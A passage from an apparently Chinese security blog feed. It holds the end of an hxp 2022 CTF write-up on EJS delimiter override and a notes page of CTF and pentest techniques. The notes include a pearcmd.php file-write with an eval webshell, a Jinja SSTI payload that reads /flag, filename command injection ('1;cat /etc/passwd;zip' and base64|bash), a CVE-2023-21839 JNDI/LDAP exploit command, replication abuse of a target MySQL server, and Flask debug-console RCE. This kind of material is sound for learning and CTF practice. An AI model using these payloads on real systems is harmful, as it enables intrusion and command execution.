<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/:template&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> query = req.<span class="property">query</span>;</span><br><span class="line">  <span class="keyword">let</span> template = req.<span class="property">params</span>.<span class="property">template</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="regexp">/^[0-9A-F]&#123;8&#125;-[0-9A-F]&#123;4&#125;-[4][0-9A-F]&#123;3&#125;-[89AB][0-9A-F]&#123;3&#125;-[0-9A-F]&#123;12&#125;$/i</span>.<span class="title function_">test</span>(template)) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&quot;Not a valid card id&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(<span class="string">`views/<span class="subst">$&#123;template&#125;</span>.ejs`</span>)) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Valentine\&#x27;s card does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!query[<span class="string">&#x27;name&#x27;</span>]) &#123;</span><br><span class="line">    query[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">render</span>(template, query);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>其中看到关键代码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> res.<span class="title function_">render</span>(template, query);</span><br></pre></td></tr></table></figure>

<p>这里会将template和query内容渲染，将query中的值把模板中变量的值替换，从而可以通过在query中重新定义<code>delimiter</code>参数，然后实现渲染覆盖原有的<code>?</code>分割符，将其替换成其他可以绕过的分隔符</p>
<p>但是这里还有过滤，对<code>template</code>进行的过滤，而<code>template</code>取自<code>:template</code></p>
<blockquote>
<p><code>:template</code> 是一个动态路由参数，它可以匹配 URL 中的任何值。例如，如果请求的 URL 是 <code>http://example.com/about</code>，那么 <code>:template</code> 就会被设置为 <code>about</code></p>
</blockquote>
<p>而template的正则匹配内容</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">!/^[<span class="number">0</span>-9A-F]&#123;<span class="number">8</span>&#125;-[<span class="number">0</span>-9A-F]&#123;<span class="number">4</span>&#125;-[<span class="number">4</span>][<span class="number">0</span>-9A-F]&#123;<span class="number">3</span>&#125;-[89AB][<span class="number">0</span>-9A-F]&#123;<span class="number">3</span>&#125;-[<span class="number">0</span>-9A-F]&#123;<span class="number">12</span>&#125;</span><br></pre></td></tr></table></figure>

<p>搜索发现是 <code>UUID version 4</code> 的格式，而<code>uuid</code>在上面代码出现</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`/<span class="subst">$&#123;uuid&#125;</span>?name=<span class="subst">$&#123;name&#125;</span>`</span>);</span><br></pre></td></tr></table></figure>

<p>这是重定向时生成的uuid，代表当我们被重定向后，</p>
<p><code>app</code>会自动渲染下面内容</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://x.x.x.x:<span class="number">9086</span>/<span class="number">365</span>c9839-b1a3-<span class="number">4</span>df9-<span class="number">8</span>c1a-<span class="number">142378</span>b79cd5?name=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>所以可以先抓包，得到重定向的uuid，</p>
<p>然后在后面添加<code>delimiter</code>参数，重新发包，从而实现利用渲染覆盖原有分隔符的目的，然后在按上面的代码<code>POST</code>发送<code>tmpl</code>参数【包含的是修改了分隔符的<code>payload</code>】</p>
<hr>
<h3 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h3><p>先打算将覆盖<code>%</code>换成<code>?</code>，先发送到<code>/template</code>，这里因为没有黑名单限制字符，于是我们的内容成功写入<code>views/$&#123;uuid&#125;.ejs</code>文件中，而<code>uuid</code>就是响应包中的</p>
<blockquote>
<p>77354ee1-466d-402f-a829-ec5e859c223e</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/2022hxp/image-20230411215254139.png"><img src="/2022hxp/image-20230411215254139.png" alt="image-20230411215254139"></a></p>
<p>但是在<code>views/$&#123;uuid&#125;.ejs</code>文件中是以%为分隔符，于是需要修改分隔符为<code>payload</code>的<code>?</code></p>
<p><a data-fancybox="gallery" data-src="/2022hxp/image-20230411220246020.png"><img src="/2022hxp/image-20230411220246020.png" alt="image-20230411220246020"></a></p>
<p>得到flag</p>
<hr>
<p>进<code>docker</code>看看</p>
<p><a data-fancybox="gallery" data-src="/2022hxp/image-20230411220931414.png"><img src="/2022hxp/image-20230411220931414.png" alt="image-20230411220931414"></a></p>
<hr>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>Game</tag>
      </tags>
  </entry>
  <entry>
    <title>笔记</title>
    <url>/Notes/</url>
    <content><![CDATA[<p><code>关键笔记，主要总结比赛中遇到的</code></p>
<span id="more"></span>

<h1 id="pearcmd-php的巧妙利用"><a href="#pearcmd-php的巧妙利用" class="headerlink" title="pearcmd.php的巧妙利用"></a><code>pearcmd.php</code>的巧妙利用</h1><blockquote>
<p>来自P神博客</p>
<p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp</a></p>
</blockquote>
<p>就是利用<code>pearcmd.php</code>这个<code>pecl/pear</code>中的文件。</p>
<p><code>pecl</code>是<code>PHP</code>中用于管理扩展而使用的命令行工具，而<code>pear</code>是<code>pecl</code>依赖的类库。在<code>7.3</code>及以前，<code>pecl/pear</code>是默认安装的；在<code>7.4</code>及以后，需要我们在编译<code>PHP</code>的时候指定<code>--with-pear</code>才会安装。</p>
<p>不过，在<code>Docker</code>任意版本镜像中，<code>pcel/pear</code>都会被默认安装，安装的路径在<code>/usr/local/lib/php</code>。</p>
<blockquote>
<p>原本pear&#x2F;pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。但我们遇到的场景比较特殊，是一个文件包含的场景，那么我们就可以包含到pear中的文件，进而利用其中的特性来搞事。</p>
</blockquote>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="string">?+</span>config-create+<span class="regexp">/&amp;file=/usr</span><span class="regexp">/local/lib</span><span class="regexp">/php/pearcmd</span>.php&amp;<span class="regexp">/&lt;?=phpinfo()?&gt;+/tmp</span><span class="regexp">/hello.php</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>#config-create，阅读其代码和帮助，可以知道，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中</p>
</blockquote>
<p>发送数据包，目标将会写入一个文件<code>/tmp/hello.php</code>，其内容包含<code>&lt;?=phpinfo()?&gt;</code></p>
<blockquote>
<p><code>/tmp/hello.php</code><br>当然也可以改成<code>/var/html/www</code>，这样就可以直接读取，不用利用文件包含参数进行对<code>/tmp/hello.php</code>读取</p>
<p>只是放在<code>/tmp</code>下不容易触发防火墙被删除</p>
</blockquote>
<p>利用文件包含存在，再包含这个文件，就会显示我们的信息</p>
<blockquote>
<p><code>&lt;?=phpinfo()?&gt;</code><br>也可以改写成<br><code>&lt;?=eval($_POST[8]);&gt;</code><br>这样就可以执行更多的命令了</p>
</blockquote>
<h1 id="libmbfl打分"><a href="#libmbfl打分" class="headerlink" title="libmbfl打分"></a>libmbfl打分</h1><blockquote>
<p>所以实现<code>$charset == BASE64</code>，只要文件内容前面数据让它识别为base64即可</p>
<p>那么如何让其认为是base64呢？</p>
<p>这就涉及到<code>libmbfl</code>的打分，<code>libmbfl</code>是<code>mb</code>扩展</p>
<p><code>https://github.com/php/php-src/blob/master/ext/mbstring/libmbfl/mbfl/mbfilter.c#L225</code></p>
<p>我的理解就是类似像<code>checkengine</code>，比如<code>mb_detect_encoding()</code>这类的函数对内容进行编码的识别，就是<code>匹配内容中的一些符合编码的字符，匹配成功对应编码加分</code>，最后从头到尾匹配完成后，<code>打分最高的编码就被认为是该内容的编码</code></p>
</blockquote>
<p>这是打分判断</p>
<blockquote>
<p>0xFFFF是-1，&gt;&#x3D;0 </p>
<blockquote>
<p>0x21是33 33对应!</p>
<p>0x2F是47 47对应&#x2F;</p>
<p><code>47&gt;=c&gt;=33</code></p>
</blockquote>
<p><code>/</code>打分打的多</p>
</blockquote>
<h1 id="Tomcat以-一种奇怪的方式进行规范化"><a href="#Tomcat以-一种奇怪的方式进行规范化" class="headerlink" title="Tomcat以;一种奇怪的方式进行规范化"></a>Tomcat以;一种奇怪的方式进行规范化</h1><blockquote>
<p><code>;</code>后的数据不解析</p>
<p>即可<code>http://127.0.0.1/index;123.ico</code>，读取时只视为<code>http://127.0.0.1/index</code></p>
</blockquote>
<h1 id="服务器端XSS【针对于动态PDF】"><a href="#服务器端XSS【针对于动态PDF】" class="headerlink" title="服务器端XSS【针对于动态PDF】"></a>服务器端XSS【针对于动态PDF】</h1><blockquote>
<p><code>https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdfhttps://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf</code></p>
</blockquote>
<p>还是从htb的机器学习到的</p>
<blockquote>
<p>比如，在一些购物网站订单会自动生成一个动态的pdf方便打印作为报销的凭证，</p>
<p>但是虽然看起像是pdf，但本质还是html网站。才可以实现动态，而其中的数据也是客户端传向服务器生成</p>
<p>那么如果传向服务器进行动态pdf生成的数据被用户控制，导致最后生成的pdf中的数据返回一些服务器的敏感的数据，就会非常危险</p>
</blockquote>
<blockquote>
<p>如果网页使用用户控制的输入创建 PDF，您可以尝试诱骗创建 PDF 的机器人执行任意 JS 代码。 因此，如果 PDF 创建者机器人找到某种 HTML 标记，它将解释它们，您可以滥用此行为<code>导致服务器 XSS</code>。</p>
</blockquote>
<p>请注意，<code>&lt;script&gt;&lt;/script&gt;</code> 标签并不总是有效，因此您需要不同的方法来执行 JS（例如，滥用 <code>&lt;img</code>,<code>&lt;iframe&gt;</code>）。 </p>
<p>另外，请注意，在常规利用中，您将能够<strong>查看&#x2F;下载创建的pdf</strong>，因此您将能够看到<code>通过JS编写的所有内容</code>（例如使用<code>document.write（）</code>）。</p>
<p>但是，如果您<strong>看不到</strong>创建的PDF，则可能需要<strong>提取信息，从而向您发出Web请求</strong>（盲写，然后看回显猜测）。</p>
<h1 id="获得稳定的shell"><a href="#获得稳定的shell" class="headerlink" title="获得稳定的shell"></a>获得稳定的shell</h1><p>【不会因为ctrl+c退出，而且可以按上下键，返回之前的命令】</p>
<blockquote>
<ol>
<li><p><strong>python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’</strong> 或者</p>
<p>**python3 -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’**进入交互式shell</p>
</li>
<li><p><code>Ctrl-Z</code>将shell放到后台</p>
</li>
<li><p><code>stty raw -echo ; fg ; reset</code></p>
</li>
</ol>
<p>&#x2F;&#x2F;stty 设置终端端口设备的接口选项</p>
<p>&#x2F;&#x2F;echo 表示回显，比如当-echo时，输入ls后按回车，仍然会看到ls</p>
<p>&#x2F;&#x2F;fg把shell提到前台来</p>
<p>&#x2F;&#x2F;reset表示重启终端，此时的终端为我们靶机的shell窗口，所以不容易被退出或者中断</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Notes/image-20221002145951718.png"><img src="/Notes/image-20221002145951718.png" alt="image-20221002145951718"></a></p>
<p>成功获得全交互式<code>shell</code></p>
<h1 id="T3协议的反序列化攻击"><a href="#T3协议的反序列化攻击" class="headerlink" title="T3协议的反序列化攻击"></a>T3协议的反序列化攻击</h1><p>这是在复现CVE-2023-21839时，查看其利用的基本原理T3&#x2F;时看到的</p>
<p><a href="https://www.cnblogs.com/unicodeSec/p/14378757.html">学习文章</a></p>
<h1 id="记第一次公网测试"><a href="#记第一次公网测试" class="headerlink" title="记第一次公网测试"></a>记第一次公网测试</h1><p>比如，在复现cve-2023-21839时</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">./web.exe -<span class="built_in">ip</span> 公网<span class="built_in">ip</span> -port <span class="number">7001</span> -ldap ldap:<span class="comment">//另一个公网ip（挂者jndi）:1389/xx</span></span><br></pre></td></tr></table></figure>

<p>如果想在本机进行复现，需要让自己的ip变成可以被公网访问的ip，在上面进行打开ldap，以及挂上恶意类，否则只能本地测试</p>
<h1 id="file-b解析-后内容显示"><a href="#file-b解析-后内容显示" class="headerlink" title="file -b解析#!后内容显示"></a>file -b解析#!后内容显示</h1><p>这里就需要一个知识点<code>#!</code>后的内容，会被视为文件的解释器，然后打印出来，比如</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230312224705119.png"><img src="/Notes/image-20230312224705119.png" alt="image-20230312224705119"></a></p>
<p>这里</p>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">a </span><span class="template-variable">&#123;&#123;<span class="name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"> script, ASCII text executable</span></span><br></pre></td></tr></table></figure>

<p>就看出来它把文本</p>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>当作了<code>script</code>解析器，在解析文件类型时，就把它打印出来了</p>
<p>于是我们上传该文件</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230312224941575.png"><img src="/Notes/image-20230312224941575.png" alt="image-20230312224941575"></a></p>
<p>得到flag</p>
<h1 id="strace命令"><a href="#strace命令" class="headerlink" title="strace命令"></a>strace命令</h1><p>在Linux系统中，strace命令是一个集诊断、调试、统计与一体的工具，可用来追踪调试程序，能够与其他命令搭配使用。</p>
<p>在Linux世界，<code>进程不能直接访问硬件设备</code>，当进程需要访问硬件设备 (比如读取磁盘文件，接收网络数据等等)时，必须由用户态模式切换至内核态模式，通过系统调用访问硬件设备。<code>strace可以跟踪到一个进程产生的系统调用,包括参数，返回值，执行消耗的时间。</code></p>
<p>而对于一些命令而言也可以监控其调用的一些文件信息</p>
<p>比如</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">strace <span class="regexp">/bin/</span><span class="keyword">file</span></span><br><span class="line">#查询<span class="keyword">file</span>命令执行需要调用的文件信息</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Notes/image-20230330210854308.png"><img src="/Notes/image-20230330210854308.png" alt="image-20230330210854308"></a></p>
<p>可以看到调用了一个<code>/etc/ld.so.preload</code>文件</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230330211853378.png"><img src="/Notes/image-20230330211853378.png" alt="image-20230330211853378"></a></p>
<h1 id="Mysql主从复制"><a href="#Mysql主从复制" class="headerlink" title="Mysql主从复制"></a>Mysql主从复制</h1><blockquote>
<p>主从复制的基础是主服务器对数据库修改记录二进制日志，从服务器通过主服务器的二进制日志自动执行更新，也就是主库只传日志给从库，从库根据日志执行命</p>
<p>[学习文章]</p>
<p>作者：小熊我不要了<br>链接：<a href="https://juejin.cn/post/6844903921677238285">https://juejin.cn/post/6844903921677238285</a></p>
</blockquote>
<p>在某比赛遇到的，一个<code>sql</code>注入环境，对语句过滤很多，也包括<code>select、updatexml</code>等等常用的语句。</p>
<p>但是没有过滤<code>show，slave，change</code>等语句</p>
<hr>
<p>该题需要一个登录，是在一个php语句中</p>
<p>大概是从ctf库中，查询其中的admin表，匹配其中用户名和密码</p>
<p>但是ctf库，利用<code>show tables in ctf;</code>发现是一个空库，连表也没有，也就是直接登录改根本不行，需要修改它的数据库，添加用户信息</p>
<p><code>show variables like &#39;secure_file_priv&#39;;</code>查看其有没有可以被读取或写入的文件，也是空</p>
<hr>
<p>所以根据主从复制的思路就是，攻击机搭建一个数据库作为主库，而环境的数据库当作从库，从而实现在攻击上进行修改使得从库【环境数据库】被修改</p>
<p>为什么会想到利用主从复制，其实很简单，过滤了这么多，但是执行</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line"><span class="built_in">show</span> slave <span class="built_in">status</span>;</span><br></pre></td></tr></table></figure>

<p>可以看到回显，并且显示Running</p>
<blockquote>
<p><strong>主从配置</strong></p>
<p>在主从配置之前需要确保两台mysql需要同步的库状态一致。</p>
</blockquote>
<h2 id="攻击机【主】"><a href="#攻击机【主】" class="headerlink" title="攻击机【主】"></a>攻击机【主】</h2><p>配置文件默认在<code>/etc/my.cnf</code>下。</p>
<p>在配置文件中新增配置：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="comment">## 同一局域网内注意要唯一</span></span><br><span class="line"><span class="attr">server-id</span>=<span class="number">100</span>  </span><br><span class="line"><span class="comment">## 开启二进制日志功能，可以随便取（关键）</span></span><br><span class="line"><span class="attr">log-bin</span>=mysql-bin</span><br></pre></td></tr></table></figure>

<p>修改配置后需要重启才能生效：</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">service mysql restart</span></span><br></pre></td></tr></table></figure>

<p>重启之后进入mysql：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">mysql -uroot -<span class="selector-tag">p</span></span><br></pre></td></tr></table></figure>

<p>在<code>master</code>数据库创建数据同步用户，授予用户 slave REPLICATION SLAVE权限和REPLICATION CLIENT权限，用于在主从库之间同步数据。</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;slave&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;@#$Rfg345634523rft4fa&#x27;</span>;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">REPLICATION</span> SLAVE, <span class="keyword">REPLICATION</span> CLIENT <span class="keyword">ON</span> *.* <span class="keyword">TO</span> <span class="string">&#x27;slave&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>语句中的<code>%</code>代表所有服务器都可以使用这个用户，如果想指定特定的ip，将<code>%</code>改成ip即可。</p>
<p>查看主mysql的状态：</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">show <span class="keyword">master</span> <span class="title">status</span>;</span><br></pre></td></tr></table></figure>

<p>记录下<code>File</code>和<code>Position</code>的值，并且不进行其他操作以免引起<code>Position</code>的变化。</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230330224610135.png"><img src="/Notes/image-20230330224610135.png" alt="image-20230330224610135"></a></p>
<blockquote>
<p><code>File</code>：这是 MySQL 服务器正在写入的当前二进制日志文件的名称。</p>
<p><code>Position</code>：这是下一个事件将被写入的二进制日志文件中的位置。</p>
</blockquote>
<h3 id="环境执行【从】"><a href="#环境执行【从】" class="headerlink" title="环境执行【从】"></a>环境执行【从】</h3><p>配置环境已经有了，所以不用考虑如何修改</p>
<blockquote>
<p>在从<code>my.cnf</code>配置中新增：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">mysqld]</span><br><span class="line"><span class="comment">## 设置server_id,注意要唯一</span></span><br><span class="line"><span class="attr">server-id</span>=<span class="number">101</span>  </span><br><span class="line"><span class="comment">## 开启二进制日志功能，以备Slave作为其它Slave的Master时使用</span></span><br><span class="line"><span class="attr">log-bin</span>=mysql-slave-bin   </span><br><span class="line"><span class="comment">## relay_log配置中继日志</span></span><br><span class="line"><span class="attr">relay_log</span>=edu-mysql-relay-bin  </span><br></pre></td></tr></table></figure>

<p>修改配置后需要重启才能生效：</p>
</blockquote>
<p>修改主库信息，将主库信息改成攻击机，用户名和密码都是主机之前建立的</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">change master <span class="keyword">to</span> <span class="attribute">master_host</span>=<span class="string">&#x27;攻击机ip&#x27;</span>, <span class="attribute">master_user</span>=<span class="string">&#x27;slave&#x27;</span>, <span class="attribute">master_password</span>=<span class="string">&#x27;@#$Rfg345634523rft4fa&#x27;</span>, <span class="attribute">master_port</span>=3306, <span class="attribute">master_log_file</span>=<span class="string">&#x27;mysql-bin.000064&#x27;</span>, master_log_pos= 12, <span class="attribute">master_connect_retry</span>=30;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>*注：日志的postion和file要修改成自己的攻击机对应的，指定从库从哪个文件进行读取，从哪个位置进行读取</p>
</blockquote>
<p>修改后，执行</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="literal">start</span> <span class="literal">slave</span>;</span><br><span class="line"><span class="comment">#开启主从复制</span></span><br></pre></td></tr></table></figure>

<p>然后执行</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">show <span class="literal">slave</span> status;</span><br><span class="line"><span class="comment">#查看同步状态</span></span><br></pre></td></tr></table></figure>

<p>得到<code>SlaveIORunning</code> 和 <code>SlaveSQLRunning</code> 都是Yes说明主从复制已经开启</p>
<p>然后就按之前得到信息，在主库建立ctf库，然后建立admin表，在里面添加user和password的数据、</p>
<p>最后等环境数据库【从库】与攻击机数据库同步后，即可进行成功登录拿到flag</p>
<blockquote>
<p>P.S</p>
<p>由于mysql8新增密码规则<code>caching_sha2_password</code>，要求密码必须有一定复杂度，必须有字母大小写、数字和特殊符号，所以可能有时密码通不过，可以尝试修改密码规则为<code>mysql_native_password</code>以实现可以用简易密码</p>
</blockquote>
<h1 id="windows与linux对-的不同解析与限制"><a href="#windows与linux对-的不同解析与限制" class="headerlink" title="windows与linux对;的不同解析与限制"></a>windows与linux对;的不同解析与限制</h1><p>在windows中，你可以将文件名名为类似</p>
<blockquote>
<p>1;hahahaha;.txt</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230501222412594.png"><img src="/Notes/image-20230501222412594.png" alt="image-20230501222412594"></a></p>
<p>而在linux中则不行，因为它会将其解析成三段命令</p>
<blockquote>
<p>1 hahahaha .txt</p>
</blockquote>
<p>如果想要命名，则需要单引号包裹</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230501222722767.png"><img src="/Notes/image-20230501222722767.png" alt="image-20230501222722767"></a></p>
<blockquote>
<p>&#x3D;&#x3D;&gt;所以如果存在一个环境，会将上传的zip文件自动解压，或者会将上传文件进行检测并把上传文件文件名包含在命令中，并且没有加上引号限制字符类型</p>
</blockquote>
<p>比如</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unzip -oq /tmp/xx -d /home/</span><br><span class="line">or</span><br><span class="line"><span class="built_in">cat</span> /tmp/xx </span><br></pre></td></tr></table></figure>

<p>那么猜测如果文件名为</p>
<blockquote>
<p>1;cat &#x2F;etc&#x2F;passwd;zip</p>
</blockquote>
<p>那么执行时，就会导致</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unzip -oq /tmp/1;</span><br><span class="line"><span class="built_in">cat</span> /etc/passwd;</span><br><span class="line">.zip -d /home/</span><br></pre></td></tr></table></figure>

<p>就实现了上传文件达到RCE的目的，并且这些命令大都是以root权限执行的命令，所以操作性极大，危害极大，实际环境应注意这些用户可控的数据数据不能不经过处理并入任何命令中去</p>
<hr>
<p>当然实际环境下命令大都可能会因为一些原因被过滤或者无法执行，亦或者是内容无法回显，可以考虑将其转换为其他编码类型，并将回显内容导入到其他文件中去，再来执行</p>
<blockquote>
<p>1;echo L2ZsYWcgPiAvdmFyL3d3dy9odG1sL3B1YmxpYy9mbGFnLnR4dA&#x3D;&#x3D;|base64 -d|bash;.zip</p>
<p>#echo &#x2F;flag &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;public&#x2F;flag.txt</p>
</blockquote>
<h1 id="Flask的Debug模式"><a href="#Flask的Debug模式" class="headerlink" title="Flask的Debug模式"></a>Flask的Debug模式</h1><p>在比赛时，看到有道题大佬一直在说看看<code>flask</code>的<code>debug</code>开启没，记录学习一下</p>
<p>使用 Flask 开发过程中存在两个常见的问题：</p>
<blockquote>
<ol>
<li>当 Flask 程序出错时，没有提示错误的详细信息；</li>
<li>修改 Flask 源代码后需要重启 Flask 程序。</li>
</ol>
</blockquote>
<p>debug模式开启的代码就是</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug = <span class="literal">True</span>) <span class="comment">#这里就是开启debug模式</span></span><br></pre></td></tr></table></figure>

<p>运行时，显示输出也会显示debug模式开启</p>
<blockquote>
<p>$ python3 debug.py</p>
<ul>
<li>Serving Flask app “debug” (lazy loading)</li>
<li>Environment: production</li>
<li><code>Debug mode: on</code></li>
<li>Restarting with stat</li>
<li>Debugger is active!</li>
<li>Debugger PIN: 316-471-540</li>
<li>Running on <a href="http://127.0.0.1:5000/">http://127.0.0.1:5000/</a> (Press CTRL+C to quit)</li>
</ul>
</blockquote>
<p>开启后，当程序运行错误时，网站页面就会将错误点所在代码显示，并且给出错误原因以及修正方案</p>
<p>而如果不开启debug模式，显示的结果就不会显示错误原因</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230615002937536.png"><img src="/Notes/image-20230615002937536.png" alt="image-20230615002937536"></a></p>
<p>而开启后就是</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230615002956862.png"><img src="/Notes/image-20230615002956862.png" alt="image-20230615002956862"></a></p>
<p>而修改的话，也不用退出程序，重新加载</p>
<p>直接修改代码，然后保存，就会成功修改并且自行重启，并且不会影响程序的正常运行，程序输出也会显示程序已修改</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230615003317118.png"><img src="/Notes/image-20230615003317118.png" alt="image-20230615003317118"></a></p>
<h2 id="利用debug功能能干啥"><a href="#利用debug功能能干啥" class="headerlink" title="利用debug功能能干啥"></a>利用debug功能能干啥</h2><p>flask在debug模式下会生成一个debugger pin，并且多次重启flask服务，PIN码不会改变</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230615134425055.png"><img src="/Notes/image-20230615134425055.png" alt="image-20230615134425055"></a></p>
<p>通过PIN码可以进入python的交互式shell</p>
<p>如</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230615134634288.png"><img src="/Notes/image-20230615134634288.png" alt="image-20230615134634288"></a></p>
<p>这里<code>1/0</code>报错</p>
<p>点击后，右边就会显示一个终端的图标，点击后，需要提供PIN码，然后便可以进入交互式shell</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230615134831790.png"><img src="/Notes/image-20230615134831790.png" alt="image-20230615134831790"></a></p>
<p>查看当前目录下文件</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">result = subprocess.run(<span class="string">&#x27;dir&#x27;</span>, shell=<span class="literal">True</span>, stdout=subprocess.PIPE)</span><br><span class="line"></span><br><span class="line">output = result.stdout.decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Notes/image-20230615135711738.png"><img src="/Notes/image-20230615135711738.png" alt="image-20230615135711738"></a></p>
<p>而服务器端的请求头</p>
<blockquote>
<p>127.0.0.1 - - [15&#x2F;Jun&#x2F;2023 13:55:30] “GET &#x2F;?&amp;<strong>debugger</strong>&#x3D;yes&amp;cmd&#x3D;import%20subprocess&amp;frm&#x3D;1667679842080&amp;s&#x3D;D2NOP9f9DNQJyoqfpR0O HTTP&#x2F;1.1” 200 -<br>127.0.0.1 - - [15&#x2F;Jun&#x2F;2023 13:55:35] “GET &#x2F;?&amp;<strong>debugger</strong>&#x3D;yes&amp;cmd&#x3D;result%20%3D%20subprocess.run(‘dir’,%20shell%3DTrue,%20stdout%3Dsubprocess.PIPE)&amp;frm&#x3D;1667679842080&amp;s&#x3D;D2NOP9f9DNQJyoqfpR0O HTTP&#x2F;1.1” 200 -<br>127.0.0.1 - - [15&#x2F;Jun&#x2F;2023 13:55:40] “GET &#x2F;?&amp;<strong>debugger</strong>&#x3D;yes&amp;cmd&#x3D;output%20%3D%20result.stdout.decode(‘gbk’)&amp;frm&#x3D;1667679842080&amp;s&#x3D;D2NOP9f9DNQJyoqfpR0O HTTP&#x2F;1.1” 200 -<br>127.0.0.1 - - [15&#x2F;Jun&#x2F;2023 13:55:45] “GET &#x2F;?&amp;<strong>debugger</strong>&#x3D;yes&amp;cmd&#x3D;print(output)&amp;frm&#x3D;1667679842080&amp;s&#x3D;D2NOP9f9DNQJyoqfpR0O HTTP&#x2F;1.1” 200 -</p>
</blockquote>
<p>所以可以看到，启动debug在公开环境下，是非常不安全的，不仅用户可以看到你的代码内容，而且如果当前flask服务的PIN码泄露，还会造成被攻击者远程执行命令等一系列恶意操作</p>
<p>但是也不容易实现这个条件</p>
